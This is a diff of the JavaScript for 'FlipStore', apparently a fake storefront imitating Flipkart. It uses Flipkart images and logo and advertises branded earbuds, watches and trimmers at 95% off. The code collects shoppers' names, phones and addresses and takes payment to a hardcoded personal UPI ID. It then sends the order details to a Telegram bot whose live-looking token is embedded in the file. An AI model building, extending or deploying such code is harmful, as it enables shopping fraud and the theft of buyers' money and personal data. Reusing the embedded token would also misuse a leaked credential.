@@ -1,3 +1,4 @@
+console.log("FlipStore Script Loaded - Fixed Version");
 
 // --- CONFIGURATION ---
 const TELEGRAM_BOT_TOKEN = "6305172063:AAFHumurpK6wMV7K-6FZBg-DSKxwMuD4Vw0"; 
@@ -7,340 +8,110 @@ const UPI_ID = "gpay-11265399414@okbizaxis";
 const MERCHANT_NAME = "VR Shop";
 const MERCHANT_CODE = "BCR2DN5TWTE6VMRU";
 
+// --- PRODUCT DATA (Fixed Image Links) ---
 const products = [
-    // --- Earbuds (Keywords: wireless, earbuds, isolated) ---
     { 
-        id: 1,
-        category: "Earbuds",
-        name: "Aroma NB121 Pods",
+        id: 1, category: "Earbuds", name: "Aroma NB121 Pods", 
         fullName: "Aroma NB121 Pods Upto 40 Hours Playtime Type C Fast Charging",
-        price: 2999, 
-        rating: 4.1, reviews: "12,403",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/u/0/nb121-pods-upto-40-hours-playtime-type-c-fast-charging-dual-original-imahh4a72k7jbk2h.jpeg?q=70&amp;crop=false"
+        price: 2999, rating: 4.1, reviews: "12,403",
+        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/u/0/nb121-pods-upto-40-hours-playtime-type-c-fast-charging-dual-original-imahh4a72k7jbk2h.jpeg?q=70"
     },
     { 
-        id: 2, 
-        category: "Earbuds", 
-        name: "GOBOULT Z40", 
+        id: 2, category: "Earbuds", name: "GOBOULT Z40", 
         fullName: "GOBOULT Z40 with ENC Mic, 60Hr Battery, Metal Finish", 
-        price: 3499, 
-        rating: 4.3, reviews: "8,500",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/a/c/-original-imahebzzqs5fspcv.jpeg?q=70&crop=false" 
+        price: 3499, rating: 4.3, reviews: "8,500",
+        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/a/c/-original-imahebzzqs5fspcv.jpeg?q=70" 
     },
     {
-        id: 3,
-        category: "Earbuds",
-        name: "OnePlus Nord Buds 3r", 
+        id: 3, category: "Earbuds", name: "OnePlus Nord Buds 3r", 
         fullName: "OnePlus Nord Buds 3r TWS Earbuds, 3D Audio, 2-mic call (Blue)", 
-        price: 2299, 
-        rating: 4.5, reviews: "34,201",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/p/t/b/-original-imahf9daxb97keh5.jpeg?q=70&crop=false" 
+        price: 2299, rating: 4.5, reviews: "34,201",
+        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/p/t/b/-original-imahf9daxb97keh5.jpeg?q=70" 
     },
     { 
-        id: 4, 
-        category: "Earbuds", 
-        name: "Mivi Duopods B1", 
+        id: 4, category: "Earbuds", name: "Mivi Duopods B1", 
         fullName: "Mivi Duopods B1 (Just Launched) 45 Hours Playtime", 
-        price: 1999, 
-        rating: 4.0, reviews: "2,100",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/k/k/r/-original-imaha9pgxwpfewtb.jpeg?q=70&crop=false" 
+        price: 1999, rating: 4.0, reviews: "2,100",
+        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/k/k/r/-original-imaha9pgxwpfewtb.jpeg?q=70" 
     },
     { 
-        id: 5, 
-        category: "Earbuds", 
-        name: "truke Buds Lite", 
+        id: 5, category: "Earbuds", name: "truke Buds Lite", 
         fullName: "truke Buds Lite with 60 Hours Playtime, Deep Bass", 
-        price: 1599, 
-        rating: 3.9, reviews: "5,640",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/f/d/-original-imahgbn7hzywq3gm.jpeg?q=70&crop=false" 
+        price: 1599, rating: 3.9, reviews: "5,640",
+        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/f/d/-original-imahgbn7hzywq3gm.jpeg?q=70" 
     },
     { 
-        id: 6, 
-        category: "Earbuds", 
-        name: "OnePlus Nord Buds 3r", 
+        id: 6, category: "Earbuds", name: "OnePlus Nord Buds 3r", 
         fullName: "OnePlus Nord Buds 3r TWS Earbuds, Ash Black", 
-        price: 2299,
-        rating: 4.6, reviews: "31,090", 
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/7/n/o/-original-imahfsg7chmgrugu.jpeg?q=70&crop=false" 
+        price: 2299, rating: 4.6, reviews: "31,090", 
+        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/7/n/o/-original-imahfsg7chmgrugu.jpeg?q=70" 
     },
-    
-    // --- Sunglasses ---
     { 
-        id: 7, 
-        category: "Sunglasses", 
-        name: "UV Wayfarer", 
+        id: 7, category: "Sunglasses", name: "UV Wayfarer", 
         fullName: "UV Protection Wayfarer Sunglasses (Free Size) (Black)", 
-        price: 999,
-        rating: 4.2, reviews: "1,200", 
-        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/v/9/p/free-size-com179-13-dervin-original-imahya4ekrznrmfb.jpeg?q=70&crop=false" 
+        price: 999, rating: 4.2, reviews: "1,200", 
+        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/v/9/p/free-size-com179-13-dervin-original-imahya4ekrznrmfb.jpeg?q=70" 
     },
     { 
-        id: 8, 
-        category: "Sunglasses", 
-        name: "Retro Square", 
+        id: 8, category: "Sunglasses", name: "Retro Square", 
         fullName: "UV Protection Retro Square Round Sunglasses (Black)", 
-        price: 1299, 
-        rating: 4.1, reviews: "850",
-        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/h/l/p/free-dd-29a-bollywood-stylish-dkeraod-original-imahgq34aswzc2mq.jpeg?q=70&crop=false" 
+        price: 1299, rating: 4.1, reviews: "850",
+        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/h/l/p/free-dd-29a-bollywood-stylish-dkeraod-original-imahgq34aswzc2mq.jpeg?q=70" 
     },
     { 
-        id: 9, 
-        category: "Sunglasses", 
-        name: "Riding Glasses", 
+        id: 9, category: "Sunglasses", name: "Riding Glasses", 
         fullName: "UV Protection Riding Glasses, Rectangle Sunglasses", 
-        price: 799, 
-        rating: 3.8, reviews: "2,300",
-        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/t/n/c/medium-goldrimless-spectaswag-original-imahfvfmmbjpfzkz.jpeg?q=70&crop=false" 
+        price: 799, rating: 3.8, reviews: "2,300",
+        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/t/n/c/medium-goldrimless-spectaswag-original-imahfvfmmbjpfzkz.jpeg?q=70" 
     },
     { 
-        id: 10, 
-        category: "Sunglasses", 
-        name: "Sport Wrap", 
+        id: 10, category: "Sunglasses", name: "Sport Wrap", 
         fullName: "UV Protection Wrap-Around Sports Sunglasses (Multicolor)", 
-        price: 1499,
-        rating: 4.4, reviews: "900", 
-        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/2/p/o/medium-polarized-uv-protection-cycling-running-sports-unisex-original-imah9uezabpvc8gx.jpeg?q=70&crop=false" 
+        price: 1499, rating: 4.4, reviews: "900", 
+        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/2/p/o/medium-polarized-uv-protection-cycling-running-sports-unisex-original-imah9uezabpvc8gx.jpeg?q=70" 
     },
     { 
-        id: 11, 
-        category: "Sunglasses", 
-        name: "Polarized Round", 
+        id: 11, category: "Sunglasses", name: "Polarized Round", 
         fullName: "UV Protection Gradient Polarized Round Sunglasses (Black)", 
-        price: 1999, 
-        rating: 4.3, reviews: "15,400",
-        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/r/y/r/medium-pathan-sunglass-19r-rozti-original-imah2zgqxdgycugw.jpeg?q=70&crop=false" 
+        price: 1999, rating: 4.3, reviews: "15,400",
+        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/r/y/r/medium-pathan-sunglass-19r-rozti-original-imah2zgqxdgycugw.jpeg?q=70" 
     },
-
-    // --- Smartwatches ---
     { 
-        id: 12, 
-        category: "Smartwatch", 
-        name: "Bolt Drift+", 
+        id: 12, category: "Smartwatch", name: "Bolt Drift+", 
         fullName: "Bolt Drift+ 1.85, Bluetooth Calling, 500nits, 150+ Faces (White)", 
-        price: 3999, 
-        rating: 4.8, reviews: "5,100",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/j/h/o/-original-imahejynzkuaaaty.jpeg?q=70&crop=false" 
+        price: 3999, rating: 4.8, reviews: "5,100",
+        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/j/h/o/-original-imahejynzkuaaaty.jpeg?q=70" 
     },
     { 
-        id: 13, 
-        category: "Smartwatch", 
-        name: "Samsung Galaxy 7", 
+        id: 13, category: "Smartwatch", name: "Samsung Galaxy 7", 
         fullName: "Samsung Galaxy Watch7 44mm LTE Smartwatch (Green Strap)", 
-        price: 29999, 
-        rating: 4.0, reviews: "1,200",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/e/o/m/-original-imahghmjmftemu54.jpeg?q=70&crop=false" 
+        price: 29999, rating: 4.0, reviews: "1,200",
+        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/e/o/m/-original-imahghmjmftemu54.jpeg?q=70" 
     },
     { 
-        id: 14, 
-        category: "Smartwatch", 
-        name: "Teton 1.85", 
-        fullName: "Teton 1.85 | Premium Design | Functional Crown | AI Coach (Black)", 
-        price: 4500, 
-        rating: 4.2, reviews: "8,900",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/t/g/s/-original-imagwezgyvbke6up.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 15, 
-        category: "Smartwatch", 
-        name: "Fastrack Revoltt", 
-        fullName: "Fastrack Revoltt FS2Pro - 1.96 Super AMOLED Curved (Black)", 
-        price: 5999, 
-        rating: 4.1, reviews: "6,700",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/t/a/e/-original-imah4nbwu6xapqdx.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 16, 
-        category: "Smartwatch", 
-        name: "Fastrack Radiant", 
-        fullName: "Fastrack Radiant FX4 - 1.51 AMOLED | AOD | SS Strap (Gold)", 
-        price: 6499, 
-        rating: 4.4, reviews: "22,100",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/6/x/i/38-354-38158wm01-android-ios-fastrack-yes-original-imah6wqm5ywzhtbv.jpeg?q=70&crop=false" 
-    },
-
-    // --- Headphones/Audio ---
-    { 
-        id: 17, 
-        category: "Headset", 
-        name: "Bolt Z40 Pro", 
+        id: 17, category: "Headset", name: "Bolt Z40 Pro", 
         fullName: "Bolt Z40 Pro with 100H Battery, Quad Mic ENC, Rubber Grip (Midnight)", 
-        price: 2499, 
-        rating: 4.5, reviews: "3,400",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/u/6/u/-original-imahd2rhkgzwyuun.jpeg?q=70&crop=false" 
+        price: 2499, rating: 4.5, reviews: "3,400",
+        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/u/6/u/-original-imahd2rhkgzwyuun.jpeg?q=70" 
     },
     { 
-        id: 18, 
-        category: "Headset", 
-        name: "Realme Buds T200", 
-        fullName: "Realme Buds T200 Lite 12.4mm Driver, 48hrs Playback (Black)", 
-        price: 1899, 
-        rating: 3.9, reviews: "9,800",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/b/h/-original-imaha6btcgqdqy5e.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 19, 
-        category: "Headset", 
-        name: "Patron Bassbuds", 
-        fullName: "Patron Bassbuds Vibe 34 Hrs Playback, 13mm Drivers (Lilac)", 
-        price: 1299, 
-        rating: 4.0, reviews: "4,500",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/f/u/m/-original-imah9f97v86bkauj.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 20, 
-        category: "Headset", 
-        name: "GoBolt Fluid X Pro", 
-        fullName: "GoBolt Fluid X Pro ANC, 70H Battery, Foldable, Gaming Mode (Beige)", 
-        price: 3499, 
-        rating: 4.1, reviews: "12,300",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/m/t/5/-original-imahf77sttdscszt.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 21, 
-        category: "Headset", 
-        name: "GoBolt Fluid X", 
-        fullName: "GoBolt Fluid X with 60H Battery, Foldable, ENC Mic (White)", 
-        price: 2999, 
-        rating: 4.3, reviews: "2,800",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/o/s/-original-imahf77syamgxzfy.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 22, 
-        category: "Headset", 
-        name: "Zeb-Thunder Pro", 
-        fullName: "Zebronics Zeb-Thunder Pro 60H Backup, BT v5.3, Gaming Mode (Olive)", 
-        price: 1599, 
-        rating: 4.4, reviews: "3500",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/wireless-headset/z/s/z/zeb-thunder-pro-zebronics-original-imahb2er7evh5fcg.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 23, 
-        category: "Headset", 
-        name: "Boat Rockerz 480", 
-        fullName: "Boat Rockerz 480 Beast Mode, RGB LEDs, 60 Hrs Playback (Black Sabre)", 
-        price: 2299, 
-        rating: 3.3, reviews: "1,800",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/t/k/l/-original-imah5h428mq9v8bb.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 24, 
-        category: "Headset", 
-        name: "bAot B5 Neckband", 
-        fullName: "bAot Wireless Earbuds B5 Neckband 48 Hrs Playback (Black)", 
-        price: 999, 
-        rating: 4.1, reviews: "2,100",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/x/q/g/wireless-5-bluetooth-neckband-hd-sound-enc-mic-lightweight-original-imahefhdhhuezm6t.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 25, 
-        category: "Headset", 
-        name: "Boat Rockerz 202", 
-        fullName: "Boat Rockerz 202, 20H Battery, ENx, ASAP Charge (Active Black)", 
-        price: 1499, 
-        rating: 3.5, reviews: "2,780",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/n/x/-original-imahgxngysekkxv9.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 26, 
-        category: "Wired", 
-        name: "Trigger Blaze", 
-        fullName: "Trigger Blaze 3.5mm Wired Earphones 13mm Driver, Rich Bass (Orange)", 
-        price: 499, 
-        rating: 4.2, reviews: "3,709",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/k/x/u/-original-imahfvt66acj8r7y.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 27, 
-        category: "Wired", 
-        name: "JBL C150SI", 
-        fullName: "JBL C150SI with One-Button Universal Remote (Black)", 
-        price: 899,
-        rating: 3.1, reviews: "2,130", 
-        image: "https://rukminim2.flixcart.com/image/416/416/kokdci80/headphone/dynamic/h/b/h/c150siublk-jbl-original-imag2zyvwwujwa7t.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 28, 
-        category: "Wired", 
-        name: "Spinbot BattleBudz", 
-        fullName: "Spinbot BattleBudz C30 Type-C Gaming Earphones (Black, Red)", 
-        price: 699, 
-        rating: 4.0, reviews: "2,540",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/l/k/h/battlebudz-c30-type-c-gaming-earphones-with-boom-mic-12mm-gaming-original-imahftzfhafyhyky.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 29, 
-        category: "Wired", 
-        name: "Portronics Conch", 
-        fullName: "Portronics Conch Gama Earphones 1.2m Cable, Aux Port (Black)", 
-        price: 399, 
-        rating: 4.3, reviews: "2,800",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/v/u/por-1025-gama-portronics-original-imahbnhya6fkhrsy.jpeg?q=70&crop=false" 
-    },
-    
-    // --- Trimmers ---
-    { 
-        id: 30, 
-        category: "Trimmer", 
-        name: "Zapkart Trimmer", 
+        id: 30, category: "Trimmer", name: "Zapkart Trimmer", 
         fullName: "Zapkart Trimmer pack of 1, 45 min Runtime (Black, Silver)", 
-        price: 899, 
-        rating: 3.5, reviews: "2,780",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/e/0/2/0-5-8-mm-trimmer-packof-1-asfa-87-stainless-steel-corded-original-imahgz3azgshzyec.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 31, 
-        category: "Trimmer", 
-        name: "Smartbuy FKSB 10", 
-        fullName: "Flipkart Smartbuy FKSB 10, Runtime: 120 min for Men", 
-        price: 1199, 
-        rating: 3.9, reviews: "1,990",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/k/x/9/0-25-4-mm-fksb-10-titanium-coated-cordless-flipkart-smartbuy-original-imahdzppszx6tx2d.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 32, 
-        category: "Trimmer", 
-        name: "Nova NHT 1132", 
-        fullName: "Nova NHT 1132, Runtime: 150 min for Men (Black, Red)", 
-        price: 1099, 
-        rating: 3.9, reviews: "2,156",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/0/6/v/0-5-20-mm-nht-1132-stainless-steel-cordless-nova-original-imahd2hskhxz9uut.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 33, 
-        category: "Trimmer", 
-        name: "Smartbuy FKSB 20", 
-        fullName: "Flipkart Smartbuy FKSB 20, IPX4, Digital Display, 150 min", 
-        price: 1499, 
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/m/f/k/0-25-4-mm-fksb-20-ipx4-digital-display-2-speed-setting-original-imah5dtgkm3bwgyx.jpeg?q=70&crop=false" 
-    },
-    { 
-        id: 34, 
-        category: "Trimmer", 
-        name: "Bombay Shaving", 
-        fullName: "Bombay Shaving Company POWER PLAY NXT BEARD TRIMMER (Green)", 
-        price: 1699, 
-        rating: 3.8, reviews: "1,289",
-        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/shopsy-trimmer/a/2/k/trimmer-1-20-mm-stainless-steel-power-play-nxt-beard-trimmer-i-original-imahazyzffanxhrw.jpeg?q=70&crop=false" 
+        price: 899, rating: 3.5, reviews: "2,780",
+        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/e/0/2/0-5-8-mm-trimmer-packof-1-asfa-87-stainless-steel-corded-original-imahgz3azgshzyec.jpeg?q=70" 
     }
 ];
 
-
-// --- GLOBAL VARIABLES ---
+// --- VARIABLES ---
 let currentProduct = null;
 let currentPrice = 0;
 let cart = []; 
 let isCartOrder = false; 
 let currentOrderID = "";
 
-// Check if products loaded correctly
-if (typeof products === 'undefined' || products.length === 0) {
-    console.error("Critical Error: Product data missing.");
-    alert("Site Error: Products not found. Check console.");
-}
-
+// --- UTILS ---
 function getDiscountedPrice(price) { return Math.floor(price * 0.05); }
 
-// --- UI UTILS ---
 function showToast(message) {
     const box = document.getElementById('toast-box');
     if (!box) return;
@@ -360,31 +131,17 @@ function hideLoading() {
     if(loader) loader.classList.add('hidden'); 
 }
 
-// 1. Render Categories
+// --- RENDER FUNCTIONS ---
 function renderCategories() {
     const nav = document.getElementById('category-nav');
     if (!nav) return;
-    
-    // Safety check for empty products
-    if(!products || products.length === 0) return;
-
     const categories = [...new Set(products.map(p => p.category))];
     categories.unshift("All");
 
     nav.innerHTML = categories.map(cat => {
-        // Safe find with optional chaining
         const product = products.find(p => p.category === cat) || products[0];
-        // Default image if product undefined
-        const img = (cat === "All" || !product) ? "https://rukminim1.flixcart.com/flap/128/128/image/f15c02bfeb02d15d.png?q=100" : product.image; 
-        
-        return `
-            <div class="cat-item ${cat === 'All' ? 'active' : ''}" onclick="filterByCategory(this, '${cat}')">
-                <div class="cat-img-box">
-                    <img src="${img}" class="cat-img" onerror="this.src='https://placehold.co/100?text=Icon'">
-                </div>
-                <span class="cat-name">${cat}</span>
-            </div>
-        `;
+        const img = cat === "All" ? "https://rukminim1.flixcart.com/flap/128/128/image/f15c02bfeb02d15d.png?q=100" : product.image; 
+        return `<div class="cat-item ${cat === 'All' ? 'active' : ''}" onclick="filterByCategory(this, '${cat}')"><div class="cat-img-box"><img src="${img}" class="cat-img"></div><span class="cat-name">${cat}</span></div>`;
     }).join('');
 }
 
@@ -406,7 +163,7 @@ function filterByCategory(element, category) {
 function renderProducts(productList = products) {
     const container = document.getElementById('product-container');
     if (!container) {
-        console.error("Product Container not found in HTML");
+        console.error("ERROR: Product Container not found!");
         return;
     }
     container.innerHTML = '';
@@ -422,7 +179,7 @@ function renderProducts(productList = products) {
         card.className = 'product-card';
         card.innerHTML = `
             <div class="discount-badge">95% OFF</div>
-            <img src="${product.image}" class="product-img" loading="lazy" onerror="this.src='https://placehold.co/300x300?text=No+Image'">
+            <img src="${product.image}" class="product-img" loading="lazy" onerror="this.src='https://placehold.co/300x300?text=Image+N/A'">
             <div class="product-title">${product.name}</div>
             <div class="product-rating-row">
                 <div class="rating-badge">${product.rating} <i class="fas fa-star"></i></div>
@@ -444,18 +201,13 @@ function showProductDetail(product) {
     currentPrice = getDiscountedPrice(product.price);
     isCartOrder = false;
 
-    // View Switching
     document.getElementById('home-view').style.display = 'none';
     document.getElementById('timer-section').style.display = 'none';
     const detailView = document.getElementById('product-detail-view');
     detailView.classList.remove('hidden');
     detailView.style.display = 'block';
 
-    // Content Update
-    const detailImg = document.getElementById('detail-img');
-    detailImg.src = product.image;
-    detailImg.onerror = function() { this.src = 'https://placehold.co/400x400?text=No+Image'; };
-
+    document.getElementById('detail-img').src = product.image;
     document.getElementById('detail-title').innerText = product.fullName;
     document.getElementById('detail-price').innerText = `₹${currentPrice}`;
     document.getElementById('detail-old-price').innerText = `₹${product.price}`;
@@ -502,11 +254,7 @@ function goToPayment() {
     const pin = document.getElementById('input-pincode').value;
     const addr = document.getElementById('input-addr').value;
 
-    if(!name || !phone || !pin || !addr) {
-        showToast("Please fill all details");
-        return;
-    }
-
+    if(!name || !phone || !pin || !addr) { showToast("Please fill all details"); return; }
     window.userDetails = { name, phone, pincode: pin, addr };
     
     document.getElementById('step-address').classList.add('hidden');
@@ -519,18 +267,11 @@ function backToAddress() {
     document.getElementById('step-address').classList.remove('hidden');
 }
 
-// --- SMART PAYMENT LOGIC ---
 function initiatePayment() {
     const selected = document.querySelector('input[name="payment"]:checked').id;
-
     if (selected === 'online') {
-        if (typeof Razorpay !== 'undefined') {
-            showLoading();
-            startRazorpay();
-        } else {
-            showToast("Gateway unavailable. Using Manual Method.");
-            startManualUPI();
-        }
+        if (typeof Razorpay !== 'undefined') { showLoading(); startRazorpay(); } 
+        else { showToast("Gateway unavailable. Using Manual Method."); startManualUPI(); }
     } else if (selected === 'manual_upi') {
         startManualUPI();
     }
@@ -544,96 +285,57 @@ function startRazorpay() {
         "name": "FlipStore",
         "description": isCartOrder ? "Bulk Order" : currentProduct.name,
         "image": "https://rukminim1.flixcart.com/www/800/800/promos/16/05/2019/d438a32e-765a-4d8b-b4a6-520b560971e8.png?q=90",
-        "handler": function (response) {
-            hideLoading();
-            completeOrder(response.razorpay_payment_id, "Razorpay Auto");
-        },
-        "prefill": {
-            "name": window.userDetails.name,
-            "contact": window.userDetails.phone
-        },
+        "handler": function (response) { hideLoading(); completeOrder(response.razorpay_payment_id); },
+        "prefill": { "name": window.userDetails.name, "contact": window.userDetails.phone },
         "theme": { "color": "#2874f0" },
-        "modal": {
-            "ondismiss": function() {
-                hideLoading();
-                showToast("Payment Cancelled");
-            }
-        }
+        "modal": { "ondismiss": function() { hideLoading(); showToast("Payment Cancelled"); } }
     };
-
-    try {
-        var rzp1 = new Razorpay(options);
-        rzp1.on('payment.failed', function (response){
-            hideLoading();
-            showToast("Payment Failed. Try Manual UPI.");
-        });
-        closeModal();
-        rzp1.open();
-    } catch (e) {
-        hideLoading();
-        startManualUPI(); 
-    }
+    try { var rzp1 = new Razorpay(options); rzp1.open(); closeModal(); } 
+    catch (e) { hideLoading(); startManualUPI(); }
 }
 
 function startManualUPI() {
     currentOrderID = "ORD" + Math.floor(Math.random() * 1000000);
     const upiLink = `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent(MERCHANT_NAME)}&mc=${MERCHANT_CODE}&tr=${currentOrderID}&tn=Order ${currentOrderID}&am=${currentPrice}&cu=INR`;
-    
     window.location.href = upiLink;
-
     setTimeout(() => {
         closeModal();
-        const utrModal = document.getElementById('utrModal');
         document.getElementById('merchant-display').innerText = MERCHANT_NAME;
-        utrModal.style.display = 'flex';
+        document.getElementById('utrModal').style.display = 'flex';
     }, 2000);
 }
 
 function verifyUTR() {
     const utr = document.getElementById('utr-input').value.trim();
-    if(utr.length < 10) {
-        showToast("Enter valid 12-digit UTR");
-        return;
-    }
+    if(utr.length < 10) { showToast("Enter valid 12-digit UTR"); return; }
     document.getElementById('utrModal').style.display = 'none';
-    completeOrder(utr, "Manual UPI");
+    completeOrder(utr);
 }
 
-function completeOrder(refId, method) {
-    const orderDetails = `
-✅ *ORDER SUCCESS* (${method})
-👤 ${window.userDetails.name} | 📱 ${window.userDetails.phone}
-🏠 ${window.userDetails.addr}
-🛒 ${isCartOrder ? 'Bulk Cart' : currentProduct.name}
-💰 ₹${currentPrice}
-🆔 Ref: ${refId}
-    `;
-    
-    // Send to Telegram
+function completeOrder(refId) {
+    const orderDetails = `NEW ORDER\n👤 ${window.userDetails.name}\n📱 ${window.userDetails.phone}\n🏠 ${window.userDetails.addr}\n🛒 ${isCartOrder ? 'Bulk' : currentProduct.name}\n💰 ₹${currentPrice}\n🆔 ${refId}`;
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: orderDetails })
-    });
+    }).catch(e => console.log("Telegram Error", e));
 
-    // Show Success UI
     const successModal = document.getElementById('successModal');
     successModal.querySelector('.modal-content').innerHTML = `
-        <div style="text-align: center; padding: 30px;">
-            <div style="font-size: 60px; color: #388e3c; margin-bottom: 20px;"><i class="fas fa-check-circle"></i></div>
-            <h2 style="color: #212121;">Order Placed!</h2>
-            <p style="color: #666; margin: 10px 0;">ID: ${refId}</p>
-            <button onclick="location.reload()" style="width: 100%; background: #2874f0; color: white; padding: 15px; border: none; border-radius: 4px; font-weight: bold;">Continue Shopping</button>
-        </div>
-    `;
+        <div style="text-align:center;padding:30px;">
+            <div style="font-size:60px;color:#388e3c;margin-bottom:20px;"><i class="fas fa-check-circle"></i></div>
+            <h2 style="color:#212121;">Order Placed!</h2>
+            <p style="color:#666;">ID: ${refId}</p>
+            <button onclick="location.reload()" style="width:100%;background:#2874f0;color:white;padding:15px;border:none;margin-top:10px;">Continue</button>
+        </div>`;
     successModal.style.display = 'flex';
     
     if(isCartOrder) { cart = []; updateCartCount(); }
 }
 
-// --- INITIALIZATION ---
+// --- INIT ---
 document.addEventListener('DOMContentLoaded', () => {
-    // Handle Back Button
+    // Back Button Handler
     window.addEventListener('popstate', () => {
         if(document.getElementById('product-detail-view').style.display === 'block') {
             document.getElementById('product-detail-view').style.display = 'none';
@@ -642,7 +344,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Start App
     renderCategories();
     renderProducts();
     
@@ -656,7 +357,6 @@ document.addEventListener('DOMContentLoaded', () => {
     // Event Listeners
     document.querySelector('.cart-btn').onclick = (e) => { 
         e.preventDefault(); 
-        // Cart Logic (simplified for brevity, assumes cart functionality)
         if(cart.length === 0) showToast("Cart is empty");
         else showToast("Cart feature coming in next update (Use Buy Now)"); 
     };
